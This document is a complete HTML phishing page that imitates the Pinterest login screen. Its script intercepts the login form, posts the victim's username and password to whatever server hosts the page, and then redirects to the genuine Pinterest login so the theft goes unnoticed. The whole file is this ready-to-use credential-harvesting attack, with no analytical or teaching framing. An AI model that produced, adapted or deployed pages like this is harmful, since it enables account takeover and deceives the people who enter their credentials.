<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Pinterest - Login</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen-Sans,Ubuntu,Cantarell,'Helvetica Neue',sans-serif;background:white}.container{display:flex;justify-content:center;align-items:center;min-height:100vh}.box{width:400px;padding:32px;text-align:center}.logo{font-size:36px;font-weight:700;color:#e60023;margin-bottom:24px}.title{font-size:24px;font-weight:600;color:#333;margin-bottom:24px}input{width:100%;padding:14px;border:2px solid #ddd;border-radius:16px;font-size:16px;margin-bottom:12px;outline:none}input:focus{border-color:#e60023}input[type="submit"]{background:#e60023;color:white;border:none;font-weight:700;font-size:16px;cursor:pointer;border-radius:24px}input[type="submit"]:hover{background:#ad081b}.link{color:#333;font-size:14px;margin-top:16px}.link a{color:#333;font-weight:600;text-decoration:none}</style></head><body><div class="container"><div class="box"><div class="logo">Pinterest</div><div class="title">Welcome back</div><form method="POST"><input type="text"name="username"placeholder="Email or username"required><input type="password"name="password"placeholder="Password"required><input type="submit"value="Log in"></form><div class="link"><a href="#">Forgot your password?</a></div></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://www.pinterest.com/login';});});</script></body></html>
